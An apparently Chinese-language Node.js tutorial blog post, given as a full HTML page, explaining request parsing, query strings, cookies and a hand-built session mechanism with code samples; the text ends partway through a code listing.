<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    <title>构建Web应用1 | unqie.mo的博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="基础功能对于一个Web应用而言，在具体的业务中，可能有以下需求：  请求方法的判断 URL的路径解析 URL中查询字符串解析 Cookie的解析 Basic认证 表单数据的解析 任意格式文件的上传处理 Session">
<meta property="og:type" content="article">
<meta property="og:title" content="构建Web应用1">
<meta property="og:url" content="http://yoursite.com/2017/08/27/构建Web应用1/index.html">
<meta property="og:site_name" content="unqie.mo的博客">
<meta property="og:description" content="基础功能对于一个Web应用而言，在具体的业务中，可能有以下需求：  请求方法的判断 URL的路径解析 URL中查询字符串解析 Cookie的解析 Basic认证 表单数据的解析 任意格式文件的上传处理 Session">
<meta property="og:updated_time" content="2018-03-04T08:44:00.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="构建Web应用1">
<meta name="twitter:description" content="基础功能对于一个Web应用而言，在具体的业务中，可能有以下需求：  请求方法的判断 URL的路径解析 URL中查询字符串解析 Cookie的解析 Basic认证 表单数据的解析 任意格式文件的上传处理 Session">
    

    
        <link rel="alternate" href="/" title="unqie.mo的博客" type="application/atom+xml" />
    

    
        <link rel="icon" href="/css/images/favicon.png" />
    

    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/libs/open-sans/styles.css">
    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">

    <link rel="stylesheet" href="/css/style.css">

    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
    
    
        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
    
    
        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
    
    
    
    


</head>

<body>
    <div id="container">
        <header id="header">
    <div id="header-main" class="header-inner">
        <div class="outer">
            <a href="/" id="logo">
                <i class="logo"></i>
                <span class="site-title">unqie.mo的博客</span>
            </a>
            <nav id="main-nav">
                
                    <a class="main-nav-link" href="/.">Home</a>
                
                    <a class="main-nav-link" href="/archives">Archives</a>
                
                    <a class="main-nav-link" href="/categories">Categories</a>
                
                    <a class="main-nav-link" href="/tags">Tags</a>
                
                    <a class="main-nav-link" href="/about">About</a>
                
            </nav>
            
            <div id="search-form-wrap">

    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"> </button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>

</div>
        </div>
    </div>
    <div id="main-nav-mobile" class="header-sub header-inner">
        <table class="menu outer">
            <tr>
                
                    <td><a class="main-nav-link" href="/.">Home</a></td>
                
                    <td><a class="main-nav-link" href="/archives">Archives</a></td>
                
                    <td><a class="main-nav-link" href="/categories">Categories</a></td>
                
                    <td><a class="main-nav-link" href="/tags">Tags</a></td>
                
                    <td><a class="main-nav-link" href="/about">About</a></td>
                
                <td>
                    
    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>

                </td>
            </tr>
        </table>
    </div>
</header>

        <div class="outer">
            
            <section id="main"><article id="post-构建Web应用1" class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
        
        
            <header class="article-header">
                
    
        <h1 class="article-title" itemprop="name">
            构建Web应用1
        </h1>
    

                
                    <div class="article-meta">
                        
    <div class="article-date">
        <i class="fa fa-calendar"></i>
        <a href="/2017/08/27/构建Web应用1/">
            <time datetime="2017-08-26T16:00:00.000Z" itemprop="datePublished">2017-08-27</time>
        </a>
    </div>


                        
    <div class="article-category">
    	<i class="fa fa-folder"></i>
        <a class="article-category-link" href="/categories/node/">node</a>
    </div>

                        
                    </div>
                
            </header>
        
        
        <div class="article-entry" itemprop="articleBody">
        
            
            <h3 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h3><p>对于一个Web应用而言，在具体的业务中，可能有以下需求：</p>
<ul>
<li>请求方法的判断</li>
<li>URL的路径解析</li>
<li>URL中查询字符串解析</li>
<li>Cookie的解析</li>
<li>Basic认证</li>
<li>表单数据的解析</li>
<li>任意格式文件的上传处理</li>
<li>Session</li>
</ul>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line">  res.end(<span class="string">'Hello world\n'</span>);</span><br><span class="line">&#125;).listen(<span class="number">1337</span>, <span class="string">'127.0.0.1'</span>);</span><br></pre></td></tr></table></figure>
<p>我们的应用可能无限复杂，但只要最终结果返回一个函数作为参数，传递给createServer()方法作为request事件的侦听器就可以了。</p>
<p>我们在业务代码开始前，需要为业务预处理一些细节，这些细节将会挂载在req或res对象上，供业务代码使用。</p>
<h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><p>在Web应用中，常见的请求方法：GET 和 POST。请求方法存在于报文的第一行的第一个单词，通常是大写。<br>HTTP_Paser在解析请求报文的时候，将报文头抽取出来，设置为req.method。</p>
<h4 id="路径解析"><a href="#路径解析" class="headerlink" title="路径解析"></a>路径解析</h4><p>除了根据请求方法进行分发外，最常见的请求判断莫过于路径的判断了。路径部分存在于报文的第一行的第二部分。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /path?foo=bar HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
<p>HTTP_Paser将其解析为req.url。一般来说，完整的URL地址如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//user:pass@host.com:8080/p/a/t/h?query=string#hash</span></span><br></pre></td></tr></table></figure></p>
<p>客户端代理（浏览器）会将这个地址解析成报文，将路径和查询部分放在报文第一行。注意：hash部分会被丢弃，不会存在于报文的任何地方。</p>
<p>根据路径进行业务处理的应用：静态文件服务器。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname;</span><br><span class="line">  fs.readFile(path.join(ROOT, pathname), <span class="function"><span class="keyword">function</span>(<span class="params">err, file</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      res.writeHead(<span class="number">404</span>);</span><br><span class="line">      res.end(<span class="string">'找不到相关文件'</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(file);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>另一个比较常见的分发场景：根据路径来选择控制器，它预设路径为控制器和行为的组合，无须额外配置路由信息：controller/action/a/b/c。<br>controller：控制器，action：控制器的行为，剩余的：作为参数进行一些别的判断。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> pathname = url.parse(req.url).pathname;</span><br><span class="line">  <span class="keyword">var</span> paths = pathname.split(<span class="string">'/'</span>);</span><br><span class="line">  <span class="keyword">var</span> controller = paths[<span class="number">1</span>] || <span class="string">'index'</span>;</span><br><span class="line">  <span class="keyword">var</span> action = paths[<span class="number">2</span>] || <span class="string">'index'</span>;</span><br><span class="line">  <span class="keyword">var</span> args = paths.slice(<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> (handles[controller] &amp;&amp; handles[controller][action]) &#123;</span><br><span class="line">    handles[controller][action].apply(<span class="literal">null</span>, [req, res].concat(args));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">500</span>);</span><br><span class="line">    res.end(<span class="string">'找不到响应控制器'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="查询字符串"><a href="#查询字符串" class="headerlink" title="查询字符串"></a>查询字符串</h4><p>Node提供了querystring模块用于处理这部分数据。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"><span class="keyword">var</span> query = querystring.parse(url.parse(req.url).query);</span><br></pre></td></tr></table></figure></p>
<p>更简洁方法（会将query解析为一个JSON对象）：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> query = url.parse(req.url, <span class="literal">true</span>).query;</span><br></pre></td></tr></table></figure></p>
<p>在业务调用产生之前，我们的中间件或者框架会将查询字符串转换，然后挂载在请求对象上供业务使用：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  req.query = url.parse(req.url, <span class="literal">true</span>).query;</span><br><span class="line">  hande(req, res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意：如果查询字符串中的键出现多次，那么它的值会是一个数组：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foo=bar&amp;foo=baz</span><br><span class="line">&#123;</span><br><span class="line">  foo: [<span class="string">'bar'</span>, <span class="string">'baz'</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>业务的判断一定要检查值是数组还是字符串，否则可能出现TypeError异常的情况。</p>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><h5 id="初识Cookie"><a href="#初识Cookie" class="headerlink" title="初识Cookie"></a>初识Cookie</h5><p>HTTP是一个无状态协议，业务却是需要一定状态的，否则无法区分用户之间的身份。如何标识和认证一个用户？最早的方案是Cookie。</p>
<p>Cookie的处理分为以下几步：</p>
<ul>
<li>服务器向客户端发送Cookie</li>
<li>浏览器将Cookie保存</li>
<li>之后每次浏览器都会将Cookie发送给服务器端</li>
</ul>
<p>客户端发送的Cookie在请求报文的Cookie字段中，我们可以通过curl工具构造这个字段：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -H <span class="string">'Cookie: foo=bar; baz=val'</span> <span class="string">'http://127.0.0.1:1337/path?foo=bar&amp;foo=baz'</span></span><br></pre></td></tr></table></figure></p>
<p>HTTP_Paser会将所有的报文字段解析到req.headers上，Cookie就是req.headers.cookie。</p>
<p>如果识别到用户访问过我们的站点，告知客户端的方式是通过响应报文实现的，响应的Cookie值在Set-Cookie字段中。它的格式与请求中的格式不太相同：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=value; Path=<span class="regexp">/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=./</span>domain.com;</span><br></pre></td></tr></table></figure></p>
<p>将响应报文中的Cookie信息序列化：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="function"><span class="keyword">function</span>(<span class="params">name, val, opt</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> pairs = [name + <span class="string">'='</span> + encode(val)];</span><br><span class="line">  opt = opt || &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (opt.maxAge) pairs.push(<span class="string">'Max-Age='</span> + opt.maxAge);</span><br><span class="line">  <span class="keyword">if</span> (opt.domain) pairs.push(<span class="string">'Domain='</span> + opt.domain);</span><br><span class="line">  <span class="keyword">if</span> (opt.path) pairs.push(<span class="string">'Path='</span> + opt.path);</span><br><span class="line">  <span class="keyword">if</span> (opt.expires) pairs.push(<span class="string">'Expires='</span> + opt.expires.toUTCString());</span><br><span class="line">  <span class="keyword">if</span> (opt.httpOnly) pairs.push(<span class="string">'HttpOnly'</span>);</span><br><span class="line">  <span class="keyword">if</span> (opt.secure) pairs.push(<span class="string">'Secure'</span>);</span><br><span class="line">  <span class="keyword">return</span> pairs.join(<span class="string">'; '</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>业务逻辑：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.cookies.isVisit) &#123;</span><br><span class="line">    res.setHeader(<span class="string">'Set-Cookie'</span>, serialize(<span class="string">'isVisit'</span>, <span class="string">'1'</span>));</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'欢迎第一次光临'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'欢迎再次光临'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>客户端收到这个带Set-Cookie的响应后，在之后的请求时会在Cookie字段中带上这个值。<br>若有多个值：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.setHeader(<span class="string">'Set-Cookie'</span>, [serialize(<span class="string">'foo'</span>, <span class="string">'bar'</span>), serialize(<span class="string">'baz'</span>, <span class="string">'val'</span>)]);</span><br></pre></td></tr></table></figure></p>
<p>完整的cookie示例：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> parseCookie = <span class="function"><span class="keyword">function</span>(<span class="params">cookie</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cookies = &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (!cookie) &#123;</span><br><span class="line">    <span class="keyword">return</span> cookies;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> list = cookie.split(<span class="string">';'</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> pair = list[i].split(<span class="string">'='</span>);</span><br><span class="line">    cookies[pair[<span class="number">0</span>].trim()] = pair[<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cookies;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> serialize = <span class="function"><span class="keyword">function</span>(<span class="params">name, val, opt</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> pairs = [name + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(val)];</span><br><span class="line">  opt = opt || &#123;&#125;;</span><br><span class="line">  <span class="keyword">if</span> (opt.maxAge) pairs.push(<span class="string">'Max-Age='</span> + opt.maxAge);</span><br><span class="line">  <span class="keyword">if</span> (opt.domain) pairs.push(<span class="string">'Domain='</span> + opt.domain);</span><br><span class="line">  <span class="keyword">if</span> (opt.path) pairs.push(<span class="string">'Path='</span> + opt.path);</span><br><span class="line">  <span class="keyword">if</span> (opt.expires) pairs.push(<span class="string">'Expires='</span> + opt.expires.toUTCString());</span><br><span class="line">  <span class="keyword">if</span> (opt.httpOnly) pairs.push(<span class="string">'HttpOnly'</span>);</span><br><span class="line">  <span class="keyword">if</span> (opt.secure) pairs.push(<span class="string">'Secure'</span>);</span><br><span class="line">  <span class="keyword">return</span> pairs.join(<span class="string">'; '</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/plain;charset=utf-8'</span>);</span><br><span class="line">  <span class="keyword">if</span> (!req.cookies.isVisit) &#123;</span><br><span class="line">    res.setHeader(<span class="string">'Set-Cookie'</span>, serialize(<span class="string">'isVisit'</span>, <span class="string">'1'</span>));</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'欢迎第一次光临'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'欢迎再次光临'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  req.cookies = parseCookie(req.headers.cookie);</span><br><span class="line">  handle(req, res);</span><br><span class="line">&#125;).listen(<span class="number">3001</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server is listening on 3001'</span>);</span><br></pre></td></tr></table></figure></p>
<h5 id="Cookie的性能影响"><a href="#Cookie的性能影响" class="headerlink" title="Cookie的性能影响"></a>Cookie的性能影响</h5><ul>
<li>减小Cookie的大小<br>Cookie在设计时限定了它的域，只有域名相同时才会发送。</li>
<li>为静态组件使用不同的域名</li>
<li>减少DNS查询<br>DNS缓存。<br>Cookie除了可以通过后端添加协议头的字段设置外，在前端浏览器中也可以通过JavaScript进行修改，浏览器将Cookie通过document.cookie暴露给了JavaScript。前端在修改Cookie后，后续的网络请求中就会带上修改过后的值。</li>
</ul>
<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>以上可知，浏览器和服务器可以实现状态的记录。但是，Cookie可以在前后端进行修改，因此数据很容易被篡改和伪造。</p>
<p>为了解决这个问题，Session应运而生。</p>
<p>Session的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到了保障，数据也无须在协议中每次都被传递。</p>
<p>如何将每个客户和服务器中的数据一一对应起来？常见的两种实现方式：</p>
<ul>
<li>基于Cookie来实现用户和数据的映射<br>虽然将所有数据都放在Cookie中不可取，但是将口令放在Cookie中还是可以的。因为口令一旦被篡改，就丢失了映射关系，也无法修改服务器端存在的数据了。并且Session的有效期较短，普通的设置是20分钟，如果在20分钟内客户端和服务器端没有交互产生，服务器端就将数据删除。</li>
</ul>
<p>那么口令是如何产生的呢？</p>
<p>一旦服务器启用了Session，它将约定一个键值作为Session的口令，这个值可以随意约定。一旦服务器检查到用户请求Cookie中没有携带该值，就会为之生成一个值，这个值是唯一且不重复的，并设定超时时间。生成session：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sessions = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">'session_id'</span>;</span><br><span class="line"><span class="keyword">var</span> EXPIRES = <span class="number">20</span> * <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> session = &#123;&#125;;</span><br><span class="line">  session.id = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + <span class="built_in">Math</span>.random();</span><br><span class="line">  session.cookie = &#123;</span><br><span class="line">    expire: (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES</span><br><span class="line">  &#125;;</span><br><span class="line">  sessions[session.id] = session;</span><br><span class="line">  <span class="keyword">return</span> session;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>每个请求过来，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> id = req.cookies[key];</span><br><span class="line">  <span class="keyword">if</span> (!id) &#123;</span><br><span class="line">    req.session = generate();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> session = sessions[id];</span><br><span class="line">    <span class="keyword">if</span> (session) &#123;</span><br><span class="line">      <span class="keyword">if</span> (session.cookie.expire &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime()) &#123;</span><br><span class="line">        <span class="comment">// 更新超时时间</span></span><br><span class="line">        session.cookie.expire = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + EXPIRES;</span><br><span class="line">        req.session = session;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 超时了，删除旧的数据，并重新生成</span></span><br><span class="line">        <span class="keyword">delete</span> sessions[id];</span><br><span class="line">        req.session = generate();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 如果session过期或口令不对，重新生成session</span></span><br><span class="line">      req.session = generate();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  handle(req, res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当然仅仅重新生成Session还不足以完成整个流程，还需要响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据。这里hack响应对象的writeHead()方法，在它的内部注入设置Cookie的逻辑。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> writeHead = res.writeHead;</span><br><span class="line">res.writeHead = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cookies = res.getHeader(<span class="string">'Set-Cookie'</span>);</span><br><span class="line">  <span class="keyword">var</span> session = serialize(key, req.session.id);     <span class="comment">// req.session.id 由服务端生成</span></span><br><span class="line">  cookies = <span class="built_in">Array</span>.isArray(cookies) ? cookies.concat(session) : [cookies, session];</span><br><span class="line">  res.setHeader(<span class="string">'Set-Cookie'</span>, cookies);</span><br><span class="line">  <span class="keyword">return</span> writeHead.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>至此，session在前后端进行对应的过程就完成了。这样，业务逻辑可以判断和设置session，以此来维护用户与服务器端的关系。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.isVisit) &#123;</span><br><span class="line">    req.session.isVisit = <span class="literal">true</span>;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'欢迎第一次来到动物园'</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>);</span><br><span class="line">    res.end(<span class="string">'动物园再次欢迎你'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>这种实现方案依赖Cookie的实现，而且也是目前大多数Web应用的方案。</p>
<p>完整的session示例：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> sessions = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> key = <span class="string">'session_id'</span>;   <span class="comment">// 客户端与服务器端约定的 session 